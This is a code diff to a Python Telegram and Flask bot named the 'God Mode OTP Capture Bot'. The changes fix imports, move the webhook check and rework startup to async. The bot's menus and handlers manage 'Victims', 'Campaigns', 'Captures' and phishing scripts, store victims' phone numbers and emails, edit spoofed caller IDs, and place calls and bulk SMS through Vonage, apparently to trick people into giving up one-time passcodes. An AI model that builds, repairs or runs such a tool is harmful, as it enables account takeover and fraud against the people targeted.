@@ -44,8 +44,7 @@ from telegram.error import TelegramError
 from vonage import Auth, Vonage
 
 from sqlalchemy import create_engine, Column, Integer, String, DateTime, LargeBinary, Text
-from sqlalchemy.ext.declarative import declarative_base
-from sqlalchemy.orm import sessionmaker, Session
+from sqlalchemy.orm import declarative_base, sessionmaker, Session
 from sqlalchemy.exc import OperationalError
 
 from dotenv import load_dotenv
@@ -715,6 +714,11 @@ def health():
 @app.route(TELEGRAM_WEBHOOK_PATH, methods=["POST"])
 @limiter.exempt
 def telegram_webhook():
+    global application
+    if application is None:
+        logger.error("Telegram bot not initialized")
+        return jsonify({"error": "service_unavailable"}), 503
+
     if TELEGRAM_WEBHOOK_SECRET_TOKEN:
         token = request.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
         if token != TELEGRAM_WEBHOOK_SECRET_TOKEN:
@@ -724,10 +728,6 @@ def telegram_webhook():
     payload = request.get_json(silent=True)
     if not payload:
         return jsonify({"error": "invalid_payload"}), 400
-
-    if not application:
-        logger.error("Telegram webhook received before bot application was initialized.")
-        return jsonify({"error": "service_unavailable"}), 503
 
     try:
         update = Update.de_json(payload, application.bot)
@@ -1020,8 +1020,8 @@ def main_menu():
         InlineKeyboardButton("👥 Victims", callback_data="victim_mgmt"),
         InlineKeyboardButton("📋 Campaigns", callback_data="camp_mgmt"),
         InlineKeyboardButton("📱 Launch", callback_data="launch"),
-        InlineKeyboardButton("�️ Scripts", callback_data="scripts_menu"),
-        InlineKeyboardButton("�📊 Captures", callback_data="view_captures"),
+        InlineKeyboardButton("📜 Scripts", callback_data="scripts_menu"),
+        InlineKeyboardButton("📊 Captures", callback_data="view_captures"),
         InlineKeyboardButton("🔒 Audit Log", callback_data="audit_log"),
         InlineKeyboardButton("⚙️ Config", callback_data="config_menu"),
     ]
@@ -1436,66 +1436,76 @@ if __name__ == "__main__":
     log_service_status()
     
     if not config.validate():
-        logger.error("Invalid configuration. Exiting."); sys.exit(1)
+        logger.error("Invalid configuration. Exiting.")
+        sys.exit(1)
 
-    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
-    application.initialize()
+    async def main():
+        global application
+        application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
+        await application.initialize()
 
-    # Conversation handler
-    conv = ConversationHandler(
-        entry_points=[CommandHandler("start", start)],
-        states={
-            MAIN: [
-                CallbackQueryHandler(button_handler),
-                CallbackQueryHandler(config_callback, pattern="^cfg_"),
-                CommandHandler("cancel", cancel)
-            ],
-            VICTIMS: [CallbackQueryHandler(button_handler)],
-            CAMPAIGNS: [CallbackQueryHandler(button_handler)],
-            LAUNCH: [CallbackQueryHandler(button_handler)],
-            SCRIPTS: [CallbackQueryHandler(button_handler)],
-            SCRIPT_PREVIEW: [CallbackQueryHandler(button_handler)],
-            ADD_VICTIM_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
-            ADD_VICTIM_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
-            ADD_VICTIM_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
-            ADD_VICTIM_SERVICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
-            EDIT_VICTIM: [
-                CallbackQueryHandler(edit_submenu, pattern="^ed"),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)
-            ],
-            EDIT_SCRIPT: [MessageHandler(filters.TEXT & ~filters.COMMAND, script_edit_text)],
-            EDIT_SPOOF: [MessageHandler(filters.TEXT & ~filters.COMMAND, spoof_edit_text)],
-            CREATE_CAMP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
-            CREATE_CAMP_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
-            CREATE_CAMP_SERVICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
-        },
-        fallbacks=[CommandHandler("cancel", cancel)],
-        per_message=False
-    )
-    application.add_handler(conv)
-    application.add_handler(CommandHandler("addvictim", add_victim_cmd))
-    application.add_handler(CommandHandler("call", call_cmd))
-    application.add_handler(CommandHandler("sendsms", send_sms_cmd))
-    application.add_handler(CommandHandler("bulksms", bulk_sms_cmd))
-    application.add_handler(CommandHandler("contacts", contacts_cmd))
-    application.add_handler(CommandHandler("help", help_cmd))
-    application.add_handler(CommandHandler("cancelconfig", cancel_config))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, config_value_receiver), group=1)
+        # Conversation handler
+        conv = ConversationHandler(
+            entry_points=[CommandHandler("start", start)],
+            states={
+                MAIN: [
+                    CallbackQueryHandler(button_handler),
+                    CallbackQueryHandler(config_callback, pattern="^cfg_"),
+                    CommandHandler("cancel", cancel)
+                ],
+                VICTIMS: [CallbackQueryHandler(button_handler)],
+                CAMPAIGNS: [CallbackQueryHandler(button_handler)],
+                LAUNCH: [CallbackQueryHandler(button_handler)],
+                SCRIPTS: [CallbackQueryHandler(button_handler)],
+                SCRIPT_PREVIEW: [CallbackQueryHandler(button_handler)],
+                ADD_VICTIM_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
+                ADD_VICTIM_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
+                ADD_VICTIM_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
+                ADD_VICTIM_SERVICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
+                EDIT_VICTIM: [
+                    CallbackQueryHandler(edit_submenu, pattern="^ed"),
+                    MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)
+                ],
+                EDIT_SCRIPT: [MessageHandler(filters.TEXT & ~filters.COMMAND, script_edit_text)],
+                EDIT_SPOOF: [MessageHandler(filters.TEXT & ~filters.COMMAND, spoof_edit_text)],
+                CREATE_CAMP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
+                CREATE_CAMP_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
+                CREATE_CAMP_SERVICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
+            },
+            fallbacks=[CommandHandler("cancel", cancel)],
+            per_message=False
+        )
+        application.add_handler(conv)
+        application.add_handler(CommandHandler("addvictim", add_victim_cmd))
+        application.add_handler(CommandHandler("call", call_cmd))
+        application.add_handler(CommandHandler("sendsms", send_sms_cmd))
+        application.add_handler(CommandHandler("bulksms", bulk_sms_cmd))
+        application.add_handler(CommandHandler("contacts", contacts_cmd))
+        application.add_handler(CommandHandler("help", help_cmd))
+        application.add_handler(CommandHandler("cancelconfig", cancel_config))
+        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, config_value_receiver), group=1)
 
-    logger.warning("🚀 God Mode OTP Capture Bot starting...")
-    # Start keep-alive pinger if configured
-    if KEEP_ALIVE_URL:
-        threading.Thread(target=keep_alive_pinger, args=(KEEP_ALIVE_URL, KEEP_ALIVE_INTERVAL), daemon=True).start()
+        logger.warning("🚀 God Mode OTP Capture Bot starting...")
+        # Start keep-alive pinger if configured
+        if KEEP_ALIVE_URL:
+            threading.Thread(target=keep_alive_pinger, args=(KEEP_ALIVE_URL, KEEP_ALIVE_INTERVAL), daemon=True).start()
 
-    if TELEGRAM_WEBHOOK_URL:
-        try:
-            application.bot.set_webhook(TELEGRAM_WEBHOOK_URL, secret_token=TELEGRAM_WEBHOOK_SECRET_TOKEN or None)
-            logger.info(f"Telegram webhook enabled at {TELEGRAM_WEBHOOK_URL}")
-        except Exception as e:
-            logger.warning(f"Could not set Telegram webhook: {e}")
+        if TELEGRAM_WEBHOOK_URL:
+            try:
+                await application.bot.set_webhook(
+                    TELEGRAM_WEBHOOK_URL,
+                    secret_token=TELEGRAM_WEBHOOK_SECRET_TOKEN or None
+                )
+                logger.info(f"Telegram webhook enabled at {TELEGRAM_WEBHOOK_URL}")
+            except Exception as e:
+                logger.warning(f"Could not set Telegram webhook: {e}")
 
-        logger.info(f"Listening for webhook updates on {TELEGRAM_WEBHOOK_PATH}")
-        run_flask()
-    else:
-        threading.Thread(target=run_flask, daemon=True).start()
-        application.run_polling(drop_pending_updates=True)
+            logger.info(f"Listening for webhook updates on {TELEGRAM_WEBHOOK_PATH}")
+            threading.Thread(target=run_flask, daemon=True).start()
+            await application.idle()
+        else:
+            threading.Thread(target=run_flask, daemon=True).start()
+            await application.start()
+            await application.idle()
+
+    asyncio.run(main())
